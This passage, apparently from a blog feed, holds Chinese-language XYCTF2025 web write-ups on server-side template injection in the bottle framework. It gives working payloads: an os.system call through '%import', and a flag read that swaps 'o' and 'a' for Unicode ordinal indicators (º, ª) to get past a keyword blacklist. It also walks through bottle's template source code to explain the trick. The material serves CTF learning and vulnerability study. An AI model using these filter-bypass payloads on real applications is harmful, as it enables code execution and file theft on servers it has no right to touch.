class="line">r=requests.get(url,params=&#123;<span class="string">&quot;payload&quot;</span>:tmp&#125;)</span><br><span class="line"></span><br><span class="line">tmp=<span class="string">f&quot;\n%import os;os.system(os.a)&quot;</span></span><br><span class="line">r=requests.get(url,params=&#123;<span class="string">&quot;payload&quot;</span>:tmp&#125;)</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># tmp=f&quot;\n%include(&#x27;1.txt&#x27;)&quot;</span></span><br><span class="line"><span class="comment"># r=requests.get(url,params=&#123;&quot;payload&quot;:tmp&#125;)</span></span><br><span class="line"><span class="comment"># print(r.text)</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;L@men7XU_d0es_n0t_w@nt_t0_g0_t0_scho01&#125;</span><br></pre></td></tr></table></figure><p>这个flag是出题人又疯的压缩包密码。</p><h2 id="出题人又疯"><a href="#出题人又疯" class="headerlink" title="出题人又疯"></a>出题人又疯</h2><p>这道题的考点是bottle框架斜体字引发的一种ssti，我们需要使用阴性顺序指示符或者阳性顺序指示符来进行。</p><p>见：<a href="https://blog.meteorkai.top/2025/04/08/bottle%E6%A1%86%E6%9E%B6%E6%96%9C%E4%BD%93%E5%AD%97%E5%BC%95%E5%8F%91%E7%9A%84ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/">https://blog.meteorkai.top/2025/04/08/bottle%E6%A1%86%E6%9E%B6%E6%96%9C%E4%BD%93%E5%AD%97%E5%BC%95%E5%8F%91%E7%9A%84ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">@File    :   app.py</span></span><br><span class="line"><span class="string">@Time    :   2025/03/29 15:52:17</span></span><br><span class="line"><span class="string">@Author  :   LamentXU </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">import</span> bottle</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">flag in /flag</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="meta">@bottle.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello, World!&#x27;</span></span><br><span class="line">blacklist = [</span><br><span class="line">    <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;import&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;;&#x27;</span> , <span class="string">&#x27;read&#x27;</span></span><br><span class="line">]</span><br><span class="line"><span class="meta">@bottle.route(<span class="params"><span class="string">&#x27;/attack&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">attack</span>():</span><br><span class="line">    payload = bottle.request.query.get(<span class="string">&#x27;payload&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> payload <span class="keyword">and</span> <span class="built_in">len</span>(payload) &lt; <span class="number">25</span> <span class="keyword">and</span> <span class="built_in">all</span>(c <span class="keyword">not</span> <span class="keyword">in</span> payload <span class="keyword">for</span> c <span class="keyword">in</span> blacklist):</span><br><span class="line">        <span class="built_in">print</span>(payload)</span><br><span class="line">        <span class="keyword">return</span> bottle.template(<span class="string">&#x27;hello &#x27;</span>+payload)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        bottle.abort(<span class="number">400</span>, <span class="string">&#x27;Invalid payload&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    bottle.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure><p>禁用了好多东西，之前的方法不行了。</p><p>原payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.79.128:5000/attack?payload=&#123;&#123;open(%27/flag%27).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>由于<code>o</code>和<code>read</code>被过滤，那么把<code>a</code>和<code>o</code>替换即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.79.128:5000/attack?payload=&#123;&#123;%BApen(%27/flag%27).re%aad()&#125;&#125;</span><br></pre></td></tr></table></figure><img src="/2025/04/09/XYCTF2025-Web-wp/image-20250409123505303.png" class="" title="This is an example image">]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>bottle框架斜体字引发的ssti模板注入</title>
      <link href="/2025/04/08/bottle%E6%A1%86%E6%9E%B6%E6%96%9C%E4%BD%93%E5%AD%97%E5%BC%95%E5%8F%91%E7%9A%84ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"/>
      <url>/2025/04/08/bottle%E6%A1%86%E6%9E%B6%E6%96%9C%E4%BD%93%E5%AD%97%E5%BC%95%E5%8F%91%E7%9A%84ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="show"><a href="#show" class="headerlink" title="show"></a>show</h2><p>xyctf2025遇到了这个知识点</p><p>环境如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> bottle</span><br><span class="line"><span class="meta">@bottle.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello, World!&#x27;</span></span><br><span class="line"><span class="meta">@bottle.route(<span class="params"><span class="string">&#x27;/attack&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">attack</span>():</span><br><span class="line">    payload = bottle.request.query.get(<span class="string">&#x27;payload&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(payload)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> bottle.template(<span class="string">&#x27;hello &#x27;</span>+payload)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        bottle.abort(<span class="number">400</span>, <span class="string">&#x27;Invalid payload&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    bottle.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>目前发现的POC只能替换俩字符，分别是<code>o</code>，<code>a</code>，在bottle的SSTI里，他们可以被直接替换成<code>ª</code> (U+00AA)，<code>º</code> (U+00BA)进而绕过各种waf。</p><p>这里给出unicode字符表的网址：<a href="https://symbl.cc/cn/unicode-table/#latin-1-supplement">https://symbl.cc/cn/unicode-table/#latin-1-supplement</a></p><hr><p><code>ª</code>的url编码是<code>%C2%AA</code>，若我们直接传入<code>http://127.0.0.1:5000/attack?payload=&#123;&#123;%C2%AAbs(-1)&#125;&#125;</code>，服务端回显如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;Âªbs(-1)&#125;&#125;</span><br><span class="line">127.0.0.1 - - [08/Apr/2025 16:27:04] &quot;GET /attack?payload=&#123;&#123;%C2%AAbs(-1)&#125;&#125; HTTP/1.1&quot; 400 752</span><br></pre></td></tr></table></figure><p>那么我们去掉<code>%C2</code>，发现页面正常回显<code>hello 1</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 - - [08/Apr/2025 16:28:01] &quot;GET /attack?payload=&#123;&#123;%AAbs(-1)&#125;&#125; HTTP/1.1&quot; 200 7</span><br><span class="line">&#123;&#123;ªbs(-1)&#125;&#125;</span><br></pre></td></tr></table></figure><hr><p>然后我们试试阳性序数指示符<code>º</code>。url编码是<code>%C2%BA</code>。若我们直接传入<code>http://192.168.79.128:5000/attack?payload=&#123;&#123;%C2%BApen(%27/flag%27).read()&#125;&#125;</code>，客户端报错，服务端回显如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;Âºpen(&#x27;/flag&#x27;).read()&#125;&#125;</span><br><span class="line">192.168.79.1 - - [08/Apr/2025 16:40:48] &quot;GET /attack?payload=&#123;&#123;%C2%BApen(%27/flag%27).read()&#125;&#125; HTTP/1.1&quot; 400 768</span><br></pre></td></tr></table></figure><p>去掉<code>%C2</code>，发现ok啦。<code>http://192.168.79.128:5000/attack?payload=&#123;&#123;%BApen(%27/flag%27).read()&#125;&#125;</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;ºpen(&#x27;/flag&#x27;).read()&#125;&#125;</span><br><span class="line">192.168.79.1 - - [08/Apr/2025 16:42:17] &quot;GET /attack?payload=&#123;&#123;%BApen(%27/flag%27).read()&#125;&#125; HTTP/1.1&quot; 200 30</span><br></pre></td></tr></table></figure><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>我们深入代码看看，个人认为bottle源码看着还是很舒服的，因为只有一个文件。</p><p>我们跟进<code>bottle.template()</code>看看</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">template</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Get a rendered template as a string iterator.</span></span><br><span class="line"><span class="string">    You can use a name, a filename or a template string as first parameter.</span></span><br><span class="line"><span class="string">    Template rendering arguments can be passed as dictionaries</span></span><br><span class="line"><span class="string">    or directly (as keyword arguments).</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    tpl = args[<span class="number">0</span>] <span class="keyword">if</span> args <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">for</span> dictarg <span class="keyword">in</span> args[<span class="number">1</span>:]:</span><br><span class="line">        kwargs.update(dictarg)</span><br><span class="line">    adapter = kwargs.pop(<span class="string">&#x27;template_adapter&#x27;</span>, SimpleTemplate)</span><br><span class="line">    lookup = kwargs.pop(<span class="string">&#x27;template_lookup&#x27;</span>, TEMPLATE_PATH)</span><br><span class="line">    tplid = (<span class="built_in">id</span>(lookup), tpl)</span><br><span class="line">    <span class="keyword">if</span> tplid <span class="keyword">not</span> <span class="keyword">in</span> TEMPLATES <span class="keyword">or</span> DEBUG:</span><br><span class="line">        settings = kwargs.pop(<span class="string">&#x27;template_settings&#x27;</span>, &#123;&#125;)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(tpl, adapter):</span><br><span class="line">            TEMPLATES[tplid] = tpl</span><br><span class="line">            <span class="keyword">if</span> settings: TEMPLATES[tplid].prepare(**settings)</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&quot;\n&quot;</span> <span class="keyword">in</span> tpl <span class="keyword">or</span> <span class="string">&quot;&#123;&quot;</span> <span class="keyword">in</span> tpl <span class="keyword">or</span> <span class="string">&quot;%&quot;</span> <span class="keyword">in</span> tpl <span class="keyword">or</span> <span class="string">&#x27;$&#x27;</span> <span class="keyword">in</span> tpl:</span><br><span class="line">            TEMPLATES[tplid] = adapter(source=tpl, lookup=lookup, **settings)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            TEMPLATES[tplid] = adapter(name=tpl, lookup=lookup, **settings)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> TEMPLATES[tplid]:</span><br><span class="line">        abort(<span class="number">500</span>, <span class="string">&#x27;Template (%s) not found&#x27;</span> % tpl)</span><br><span class="line">    <span class="keyword">return</span> TEMPLATES[tplid].render(kwargs)</span><br></pre></td></tr></table></figure><p>这里主要就是指定模板引擎和模板文件的搜索路径。还有下面的模板缓存机制：</p><blockquote><ol><li><strong>缓存逻辑</strong>：如果模板未缓存或处于调试模式（<code>DEBUG=True</code>），则重新加载模板。<ul><li><strong>直接使用模板对象</strong>：如果 <code>tpl</code> 已经是适配器实例，直接缓存。</li><li><strong>模板字符串</strong>：如果包含换行符或模板语法符号（<code>&#123;</code>, <code>%</code>, <code>$</code>），视为模板字符串。</li><li><strong>模板文件</strong>：否则视为文件名，从 <code>lookup</code> 路径加载。</li></ul></li></ol></blockquote><p>识别出模板标识符后将其视为模板字符串，再交给<code>adapter</code>，也就是<code>SimpleTemplate</code>。使用<code>render()</code>作为入口函数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">render</span>(<span class="params">self, *args, **kwargs</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot; Render the template using keyword arguments as local variables. &quot;&quot;&quot;</span></span><br><span class="line">    env = &#123;&#125;</span><br><span class="line">    stdout = []</span><br><span class="line">    <span class="keyword">for</span> dictarg <span class="keyword">in</span> args:</span><br><span class="line">        env.update(dictarg)</span><br><span class="line">    env.update(kwargs)</span><br><span class="line">    <span class="variable language_">self</span>.execute(stdout, env)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(stdout)</span><br></pre></td></tr></table></figure><p>用 <code>env.update()</code> 把所有位置参数（<code>*args</code>）合并进 <code>env</code> 中；把关键字参数（<code>**kwargs</code>）也加入到 <code>env</code> 中；最后调用当前类的<code>execute</code>方法。我们跟进看看：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">execute</span>(<span class="params">self, _stdout, kwargs</span>):</span><br><span class="line">    env = <span class="variable language_">self</span>.defaults.copy()</span><br><span class="line">    env.update(kwargs)</span><br><span class="line">    env.update(&#123;</span><br><span class="line">        <span class="string">&#x27;_stdout&#x27;</span>: _stdout,</span><br><span class="line">        <span class="string">&#x27;_printlist&#x27;</span>: _stdout.extend,</span><br><span class="line">        <span class="string">&#x27;include&#x27;</span>: functools.partial(<span class="variable language_">self</span>._include, env),</span><br><span class="line">        <span class="string">&#x27;rebase&#x27;</span>: functools.partial(<span class="variable language_">self</span>._rebase, env),</span><br><span class="line">        <span class="string">&#x27;_rebase&#x27;</span>: <span class="literal">None</span>,</span><br><span class="line">        <span class="string">&#x27;_str&#x27;</span>: <span class="variable language_">self</span>._<span class="built_in">str</span>,</span><br><span class="line">        <span class="string">&#x27;_escape&#x27;</span>: <span class="variable language_">self</span>._escape,</span><br><span class="line">        <span class="string">&#x27;get&#x27;</span>: env.get,</span><br><span class="line">        <span class="string">&#x27;setdefault&#x27;</span>: env.setdefault,</span><br><span class="line">        <span class="string">&#x27;defined&#x27;</span>: env.__contains__</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="built_in">exec</span>(<span class="variable language_">self</span>.co, env)</span><br><span class="line">    <span class="keyword">if</span> env.get(<span class="string">&#x27;_rebase&#x27;</span>):</span><br><span class="line">        subtpl, rargs = env.pop(<span class="string">&#x27;_rebase&#x27;</span>)</span><br><span class="line">        rargs[<span class="string">&#x27;base&#x27;</span>] = <span class="string">&#x27;&#x27;</span>.join(_stdout)  <span class="comment">#copy stdout</span></span><br><span class="line">        <span class="keyword">del</span> _stdout[:]  <span class="comment"># clear stdout</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>._include(env, subtpl, **rargs)</span><br><span class="line">    <span class="keyword">return</span> env</span><br></pre></td></tr></table></figure><p>可以看到在exec的全局变量里定义了一个<code>_escape</code>和<code>_printlist</code>函数。</p><p>模板代码的执行其实就是在<code> exec(self.co, env)</code>，我们跟进看看<code>self.co</code>（即要执行的代码）。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@cached_property</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">co</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">compile</span>(<span class="variable language_">self</span>.code, <span class="variable language_">self</span>.filename <span class="keyword">or</span> <span class="string">&#x27;&lt;string&gt;&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>)</span><br></pre></td></tr></table></figure><p>这个<code>@cached_property</code>可以理解为是一个优化机制，用来避免重复计算。</p><p>进行了一次compile（编译），我们直接跟进<code>self.code</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">code</span>(<span class="params">self</span>):</span><br><span class="line">    source = <span class="variable language_">self</span>.source</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> source:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="variable language_">self</span>.filename, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            source = f.read()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        source, encoding = touni(source), <span class="string">&#x27;utf8&#x27;</span></span><br><span class="line">    <span class="keyword">except</span> UnicodeError:</span><br><span class="line">        <span class="keyword">raise</span> depr(<span class="number">0</span>, <span class="number">11</span>, <span class="string">&#x27;Unsupported template encodings.&#x27;</span>, <span class="string">&#x27;Use utf-8 for templates.&#x27;</span>)</span><br><span class="line">    parser = StplParser(source, encoding=encoding, syntax=<span class="variable language_">self</span>.syntax)</span><br><span class="line">    code = parser.translate()</span><br><span class="line">    <span class="variable language_">self</span>.encoding = parser.encoding</span><br><span class="line">    <span class="keyword">return</span> code</span><br></pre></td></tr></table></figure><p>我们在try里面，touni的下方加一个<code>print(source)</code></p><p>当我们传入以下参数的时候，我们看看服务端print</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:5000/attack?payload=&#123;&#123;hello%20world&#125;&#125;</span><br></pre></td></tr></table></figure><img src="/2025/04/08/bottle%E6%A1%86%E6%9E%B6%E6%96%9C%E4%BD%93%E5%AD%97%E5%BC%95%E5%8F%91%E7%9A%84ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20250408172108822.png" class="" title="This is an example image"><p>发现这里的source其实就是我们传入的参数。</p><p>跟进touni看看：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">touni</span>(<span class="params">s, enc=<span class="string">&#x27;utf8&#x27;</span>, err=<span class="string">&#x27;strict&#x27;</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(s, <span class="built_in">bytes</span>):</span><br><span class="line">        <span class="keyword">return</span> s.decode(enc, err)</span><br><span class="line">    <span class="keyword">return</span> unicode(<span class="string">&quot;&quot;</span> <span class="keyword">if</span> s <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">else</span> s)</span><br></pre></td></tr></table></figure><p>如果是字节类型的，decode后return，否则return一个<code>unicode(&quot;&quot; if s is None else s)</code>，然后我们看看unicode的定义：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unicode = str</span><br></pre></td></tr></table></figure><p>unicode是一个str类，全体str！</p><p>然后我们再回到<code>code()</code>方法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">parser = StplParser(source, encoding=encoding, syntax=<span class="variable language_">self</span>.syntax)</span><br><span class="line">code = parser.translate()</span><br></pre></td></tr></table></figure><p>跟进一下<code>StplParser</code>的<code>translete</code>方法。<code>StplParser</code> 类是用来解析和转换某种模板或源代码的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">translate</span>(<span class="params">self</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="variable language_">self</span>.offset: <span class="keyword">raise</span> RuntimeError(<span class="string">&#x27;Parser is a one time instance.&#x27;</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        m = <span class="variable language_">self</span>.re_split.search(<span class="variable language_">self</span>.source, pos=<span class="variable language_">self</span>.offset)</span><br><span class="line">        <span class="keyword">if</span> m:</span><br><span class="line">            text = <span class="variable language_">self</span>.source[<span class="variable language_">self</span>.offset:m.start()]</span><br><span class="line">            <span class="variable language_">self</span>.text_buffer.append(text)</span><br><span class="line">            <span class="variable language_">self</span>.offset = m.end()</span><br><span class="line">            <span class="keyword">if</span> m.group(<span class="number">1</span>):  <span class="comment"># Escape syntax</span></span><br><span class="line">                line, sep, _ = <span class="variable language_">self</span>.source[<span class="variable language_">self</span>.offset:].partition(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">                <span class="variable language_">self</span>.text_buffer.append(<span class="variable language_">self</span>.source[m.start():m.start(<span class="number">1</span>)] +</span><br><span class="line">                                        m.group(<span class="number">2</span>) + line + sep)</span><br><span class="line">                <span class="variable language_">self</span>.offset += <span class="built_in">len</span>(line + sep)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="variable language_">self</span>.flush_text()</span><br><span class="line">            <span class="variable language_">self</span>.offset += <span class="variable language_">self</span>.read_code(<span class="variable language_">self</span>.source[<span class="variable language_">self</span>.offset:],</span><br><span class="line">                                          multiline=<span class="built_in">bool</span>(m.group(<span class="number">4</span>)))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="variable language_">self</span>.text_buffer.append(<span class="variable language_">self</span>.source[<span class="variable language_">self</span>.offset:])</span><br><span class="line">    <span class="variable language_">self</span>.flush_text()</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(<span class="variable language_">self</span>.code_buffer)</span><br></pre></td></tr></table></figure><p>这段代码主要就是将模板&#x2F;自定义语法转换为可执行代码（如 Python）。</p><p>这里我们主要关注的是<code>self.flush_text()</code>，我们跟进一下。</p><ul><li><strong><code>flush_text()</code></strong>: 将 <code>text_buffer</code> 中的普通文本转换为目标代码（如 Python 的 <code>print()</code> 语句）。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">flush_text</span>(<span class="params">self</span>):</span><br><span class="line">    text = <span class="string">&#x27;&#x27;</span>.join(<span class="variable language_">self</span>.text_buffer)</span><br><span class="line">    <span class="keyword">del</span> <span class="variable language_">self</span>.text_buffer[:]</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> text: <span class="keyword">return</span></span><br><span class="line">    parts, pos, nl = [], <span class="number">0</span>, <span class="string">&#x27;\\\n&#x27;</span> + <span class="string">&#x27;  &#x27;</span> * <span class="variable language_">self</span>.indent</span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> <span class="variable language_">self</span>.re_inl.finditer(text):</span><br><span class="line">        prefix, pos = text[pos:m.start()], m.end()</span><br><span class="line">        <span class="keyword">if</span> prefix:</span><br><span class="line">            parts.append(nl.join(<span class="built_in">map</span>(<span class="built_in">repr</span>, prefix.splitlines(<span class="literal">True</span>))))</span><br><span class="line">        <span class="keyword">if</span> prefix.endswith(<span class="string">&#x27;\n&#x27;</span>): parts[-<span class="number">1</span>] += nl</span><br><span class="line">        parts.append(<span class="variable language_">self</span>.process_inline(m.group(<span class="number">1</span>).strip()))</span><br><span class="line">    <span class="keyword">if</span> pos &lt; <span class="built_in">len</span>(text):</span><br><span class="line">        prefix = text[pos:]</span><br><span class="line">        lines = prefix.splitlines(<span class="literal">True</span>)</span><br><span class="line">        <span class="keyword">if</span> lines[-<span class="number">1</span>].endswith(<span class="string">&#x27;\\\\\n&#x27;</span>): lines[-<span class="number">1</span>] = lines[-<span class="number">1</span>][:-<span class="number">3</span>]</span><br><span class="line">        <span class="keyword">elif</span> lines[-<span class="number">1</span>].endswith(<span class="string">&#x27;\\\\\r\n&#x27;</span>): lines[-<span class="number">1</span>] = lines[-<span class="number">1</span>][:-<span class="number">4</span>]</span><br><span class="line">        parts.append(nl.join(<span class="built_in">map</span>(<span class="built_in">repr</span>, lines)))</span><br><span class="line">    code = <span class="string">&#x27;_printlist((%s,))&#x27;</span> % <span class="string">&#x27;, &#x27;</span>.join(parts)</span><br><span class="line">    <span class="variable language_">self</span>.lineno += code.count(<span class="string">&#x27;\n&#x27;</span>) + <span class="number">1</span></span><br><span class="line">    <span class="variable language_">self</span>.write_code(code)</span><br></pre></td></tr></table></figure><p>这里我们在code下方加一个<code>print(code)</code></p><p>我们访问<code>http://127.0.0.1:5000/attack?payload=hello&#123;&#123;hello%20world&#125;&#125;</code>，服务端回显如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hello&#123;&#123;hello world&#125;&#125;</span><br><span class="line">_printlist((&#x27;hello hello&#x27;, _escape(hello world),))</span><br></pre></td></tr></table></figure><p>这个_printlist就是在exec执行的全局空间里的打印函数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 